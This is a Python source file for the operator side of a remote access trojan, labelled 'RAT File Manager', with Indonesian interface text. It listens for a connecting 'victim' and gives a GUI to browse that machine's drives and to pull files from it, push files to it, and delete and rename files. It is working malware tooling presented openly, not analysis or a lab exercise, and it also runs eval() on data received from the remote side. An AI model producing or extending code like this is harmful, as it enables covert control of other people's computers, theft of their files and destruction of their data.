import socket
import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, simpledialog
import os

HOST = '0.0.0.0'
PORT = 9999

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

client = None
current_path = "."

root = tk.Tk()
root.title("🧠 RAT File Manager")
root.geometry("700x500")

path_label = tk.Label(root, text="Path: /", anchor='w')
path_label.pack(fill='x')

tree = ttk.Treeview(root, columns=("Name", "Type"), show='headings')
tree.heading("Name", text="Name")
tree.heading("Type", text="Type")
tree.pack(fill='both', expand=True)

def send_cmd(cmd):
    try:
        client.send(cmd.encode())
    except:
        messagebox.showerror("Error", "Client disconnected")

def receive_file(filename):
    try:
        downloads_dir = os.path.join(os.getcwd(), "Downloads")
        os.makedirs(downloads_dir, exist_ok=True)

        save_path = os.path.join(downloads_dir, filename)

        with open(save_path, "wb") as f:
            while True:
                data = client.recv(1024)
                if b"EOF" in data:
                    f.write(data.replace(b"EOF", b""))
                    break
                f.write(data)

        messagebox.showinfo("Download", f"File berhasil disimpan ke:\n{save_path}")
    except Exception as e:
        messagebox.showerror("Download Gagal", str(e))

def refresh():
    send_cmd("ls .")

def go_back():
    send_cmd("cd ..")
    send_cmd("ls .")

def on_double_click(event):
    item = tree.selection()
    if not item:
        return
    name = tree.item(item[0])['values'][0]
    typ = tree.item(item[0])['values'][1]
    if typ == "DIR":
        send_cmd(f"cd {name}")
        send_cmd("ls .")
    else:
        send_cmd(f"download {name}")
        receive_file(name)

def upload_file():
    def do_upload():
        file_path = filedialog.askopenfilename()
        if file_path:
            filename = os.path.basename(file_path)
            send_cmd(f"upload {filename}")
            ack = client.recv(1024)
            if ack == b"READY":
                with open(file_path, "rb") as f:
                    while chunk := f.read(1024):
                        client.send(chunk)
                client.send(b"EOF")
                root.after(0, lambda: messagebox.showinfo("Upload", f"File '{filename}' berhasil diunggah"))
                refresh()
            else:
                root.after(0, lambda: messagebox.showerror("Upload", "Client tidak siap menerima file"))

    threading.Thread(target=do_upload, daemon=True).start()

def download_selected():
    item = tree.selection()
    if not item:
        messagebox.showinfo("Info", "Pilih file yang ingin diunduh")
        return
    name = tree.item(item[0])['values'][0]
    typ = tree.item(item[0])['values'][1]
    if typ == "DIR":
        messagebox.showinfo("Info", "Hanya file yang bisa diunduh")
        return
    send_cmd(f"download {name}")
    threading.Thread(target=receive_file, args=(name,), daemon=True).start()

def delete_item():
    item = tree.selection()
    if not item:
        return
    name = tree.item(item[0])['values'][0]
    if messagebox.askyesno("Hapus", f"Hapus '{name}'?"):
        send_cmd(f"delete {name}")
        refresh()

def rename_item():
    item = tree.selection()
    if not item:
        return
    old = tree.item(item[0])['values'][0]
    new = simpledialog.askstring("Rename", f"Ganti nama '{old}' ke:")
    if new:
        send_cmd(f"rename {old} {new}")
        refresh()

def pick_drive():
    send_cmd("drives")

frame = tk.Frame(root)
frame.pack(pady=5)

tk.Button(frame, text="⬅️ Back", command=go_back).pack(side='left', padx=5)
tk.Button(frame, text="🔍 Refresh", command=refresh).pack(side='left', padx=5)
tk.Button(frame, text="⏫ Upload", command=upload_file).pack(side='left', padx=5)
tk.Button(frame, text="🗑️ Delete", command=delete_item).pack(side='left', padx=5)
tk.Button(frame, text="📝 Rename", command=rename_item).pack(side='left', padx=5)
tk.Button(frame, text="💽 Drive", command=pick_drive).pack(side='left', padx=5)

tk.Button(frame, text="⏬ Download", command=download_selected).pack(side='left', padx=5)

def handle_recv():
    global current_path
    while True:
        try:
            data = client.recv(4096)
            if not data:
                break

            decoded = data.decode(errors='ignore')

            if decoded.startswith("PATH: "):
                current_path = decoded.replace("PATH: ", "")
                root.after(0, lambda: path_label.config(text=f"Path: {current_path}"))

            elif decoded.startswith("LS: "):
                items = eval(decoded.replace("LS: ", ""))
                def update_tree():
                    tree.delete(*tree.get_children())
                    for name, typ in items:
                        tree.insert('', 'end', values=(name, typ))
                root.after(0, update_tree)

            elif decoded.startswith("DRIVES: "):
                drive_list = decoded.replace("DRIVES: ", "").split(";")
                def show_drive_prompt():
                    selected = simpledialog.askstring("Pilih Drive", f"Drive tersedia:\n{', '.join(drive_list)}\nContoh: D:\\")
                    if selected:
                        send_cmd(f"cd {selected}")
                        send_cmd("ls .")
                root.after(0, show_drive_prompt)

            elif decoded.startswith("DRIVES_ERROR:"):
                error_msg = decoded.replace("DRIVES_ERROR:", "").strip()
                root.after(0, lambda: messagebox.showerror("Error", f"Gagal ambil drive list:\n{error_msg}"))

        except Exception as e:
            print(f"[ERROR RECV]: {e}")
            break

def wait_for_client():
    global client
    print("[+] Menunggu korban...")
    client, addr = server.accept()
    client.settimeout(10)  # timeout 10 detik
    print(f"[+] Terhubung dari {addr}")
    threading.Thread(target=handle_recv, daemon=True).start()
    send_cmd("ls .")

threading.Thread(target=wait_for_client, daemon=True).start()
root.mainloop()
